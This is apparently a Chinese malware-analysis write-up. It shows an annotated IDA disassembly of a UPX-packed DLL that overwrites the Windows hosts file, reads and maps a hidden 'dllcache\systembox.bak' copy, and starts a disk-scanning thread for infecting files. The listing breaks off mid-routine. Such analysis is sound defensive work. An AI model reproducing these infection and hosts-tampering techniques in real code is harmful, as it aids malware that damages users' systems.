
# 汇编代码分析

## 初始化 Hosts 文件操作

```
UPX0:10003456           push    eax          ; 缓冲区  
UPX0:10003457           call    GetSystemDirectoryA ; 得到系统所在目录的路径  
UPX0:1000345D           push    offset aDriversEtcHost ; "\\\\drivers\\\\etc\\\\hosts"  
UPX0:10003462           lea     eax, [ebp+Dst]  ; 系统目录的路径，C:\\\windows\\\\  
UPX0:10003468           push    eax  
UPX0:10003469           call    lstrcat        ; 把他们接上得到完整路径，C:\\WINDOWS\\\\drivers\\\\etc\\\\hosts  
UPX0:1000346F           push    0            ; 模板文件的句柄  
UPX0:10003471           push    80h          ; 文件的标志和属性  
UPX0:10003476           push    3            ; 创建文件的方式  
UPX0:10003478           push    0            ; 安全标志  
UPX0:1000347A           push    3            ; 共享模式  
UPX0:1000347C           push    0C000000h     ; 访问标志  
UPX0:10003481           lea     eax, [ebp+Dst]  
UPX0:10003487           push    eax          ; 文件的名称  
UPX0:10003488           call    CreateFileA  
UPX0:1000348E           mov     [ebp+hObject], eax ; 返回值放入这里 hObject  
UPX0:10003491           mov     [ebp+lpBuffer], offset a127_0_0_1Local ; "127.0.0.1       localhost\r\n"  
UPX0:10003498           push    0            ; WriteFile 的参数  
UPX0:1000349A           lea     eax, [ebp-1Ch]  
UPX0:1000349D           push    eax  
UPX0:1000349E           push    [ebp+lpBuffer]  ; 上面的字符串  
UPX0:100034A1           call    lstrlen         ; 测试上面字符串的长度  
UPX0:100034A7           push    eax          ; nNumberOfBytesToWrite  
UPX0:100034A8           push    [ebp+lpBuffer]  ; lpBuffer  
UPX0:100034AB           push    [ebp+hObject]   ; hFile  
UPX0:100034AE           call    WriteFile       ; 写入上面的字符串到创建的文件  
UPX0:100034B4           push    [ebp+hObject]  
UPX0:100034B7           call    SetEndOfFile    ; 设置文件结束  
UPX0:100034BD           push    [ebp+hObject]  
UPX0:100034C0           call    CloseHandle     ; 关闭文件句柄  
```

## 内存初始化与 DllCache 路径构建

```
UPX0:100034C6           push    104h          ; 初始化大小  
UPX0:100034CB           push    0            ; 设置的字符串  
UPX0:100034CD           push    offset FileName ; 初始化的起始偏移地址  
UPX0:100034D2           call    memset  
UPX0:100034D7           add     esp, 0Ch  
UPX0:100034DA           push    104h          ; 缓冲区大小  
UPX0:100034DF           push    offset FileName ; 缓冲区  
UPX0:100034E4           call    GetSystemDirectoryA ; 获得系统目录的路径  
UPX0:100034EA           push    offset aDllcacheSystem ; "\\\\dllcache\\\\systembox.bak"  
UPX0:100034EF           push    offset FileName ; 系统路径 C:\\Windows  
UPX0:100034F4           call    lstrcat         ; 上面的字符串接上，得到一个完整的路径  
UPX0:100034FA           and     dword ptr [ebp-138h], 0 ; 这里放入 0  
UPX0:10003501           jmp     short loc_10003510  
UPX0:10003503 ; ---------------------------------------------------------------------------  
UPX0:10003503  
UPX0:10003503 loc_10003503:                   ; CODE XREF: sub_1000332A+244j  
UPX0:10003503           mov     eax, [ebp-138h]  
UPX0:10003509           inc     eax  
UPX0:1000350A           mov     [ebp-138h], eax  
UPX0:10003510  
UPX0:10003510 loc_10003510:                   ; CODE XREF: sub_1000332A+1D7j  
UPX0:10003510           cmp     dword ptr [ebp-138h], 100 ; 比较是否大于或等于 100  
UPX0:10003517           jge     short loc_10003570 ; 大于等于 100 就跳，不然重复执行下面 100 次  
UPX0:10003519           push    0  
UPX0:1000351B           push    80h  
UPX0:10003520           push    3  
UPX0:10003522           push    0  
UPX0:10003524           push    0  
UPX0:10003526           push    80000000h  
UPX0:1000352B           push    offset FileName  
UPX0:10003530           call    CreateFileA     ; 创建文件  
UPX0:10003536           mov     [ebp+hFile], eax ; 返回值放到这里  
UPX0:1000353C           cmp     [ebp+hFile], 0FFFFFFFFh ; 比较返回值是否为-1  
UPX0:10003543           jz      short loc_10003566 ; 等于-1 就跳  
UPX0:10003545           push    0            ; lpFileSizeHigh  
UPX0:10003547           push    [ebp+hFile]     ; hFile  
UPX0:1000354D           call    GetFileSize     ; 获得文件的大小  
UPX0:10003553           mov     nNumberOfBytesToWrite, eax ; 文件大小的返回值放入这里  
UPX0:10003558           push    [ebp+hFile]     ; hObject  
UPX0:1000355E           call    CloseHandle     ; 关闭文件句柄  
UPX0:10003564           jmp     short loc_10003570  
UPX0:10003566 ; ---------------------------------------------------------------------------  
UPX0:10003566  
UPX0:10003566 loc_10003566:                   ; CODE XREF: sub_1000332A+219j  
UPX0:10003566           push    64h           ; dwMilliseconds  
UPX0:10003568           call    Sleep  
UPX0:1000356E           jmp     short loc_10003503  
UPX0:10003570 ; ---------------------------------------------------------------------------  
UPX0:10003570  
UPX0:10003570 loc_10003570:                   ; CODE XREF: sub_1000332A+1EDj  
UPX0:10003570                                     ; sub_1000332A+23Aj  
UPX0:10003570           cmp     nNumberOfBytesToWrite, 0  
UPX0:10003577           jbe     loc_10003672    ; 判断返回值的状态  
UPX0:1000357D           cmp     nNumberOfBytesToWrite, 0FFFFFFFFh  
UPX0:10003584           jz      loc_10003672    ; 判断返回值的状态  
UPX0:1000358A           push    0  
UPX0:1000358C           push    80h  
UPX0:10003591           push    3  
UPX0:10003593           push    0  
UPX0:10003595           push    1  
UPX0:10003597           push    80000000h  
UPX0:1000359C           push    offset FileName  
UPX0:100035A1           call    CreateFileA     ; 创建文件  
UPX0:100035A7           mov     hFile, eax  
UPX0:100035AC           push    0  
UPX0:100035AE           push    0  
UPX0:100035B0           push    0  
UPX0:100035B2           push    2  
UPX0:100035B4           push    0  
UPX0:100035B6           push    hFile  
UPX0:100035BC           call    CreateFileMappingA ; 创建文件映射  
UPX0:100035C2           mov     hFileMappingObject, eax  
UPX0:100035C7           push    0  
UPX0:100035C9           push    0  
UPX0:100035CB           push    0  
UPX0:100035CD           push    4  
UPX0:100035CF           push    hFileMappingObject  
UPX0:100035D5           call    MapViewOfFile   ; 映射文件  
UPX0:100035DB           mov     lpBuffer, eax   ; 映射文件的返回值放到 lpBuffer  
UPX0:100035E0           cmp     dword_10008454, 0  
UPX0:100035E7           jz      short loc_10003607  
UPX0:100035E9           cmp     lpBuffer, 0     ; 比较返回值是否为 0  
UPX0:100035F0           jz      short loc_10003607 ; 等于 0 就跳，不然创建一个线程  
UPX0:100035F2           push    0  
UPX0:100035F4           push    0  
UPX0:100035F6           push    0  
UPX0:100035F8           push    offset sub_1000311F ; 磁盘操作，扫描制定格式文件  
UPX0:100035FD           push    0  
UPX0:100035FF           push    0  
UPX0:10003601           call    CreateThread  
UPX0:10003607  
UPX0:10003607 loc_10003607:                   ; CODE XREF: sub_1000332A+2BDj  
UPX0:10003607                                     ; sub_1000332A+2C6j  
UPX0:10003607           cmp     dword_10008460, 0  
UPX0:1000360E           jz      short loc_10003628  
UPX0:10003610           push    0  
UPX0:10003612           push    0  
UPX0:10003614           push    offset aLan      ; "LAN"  
```
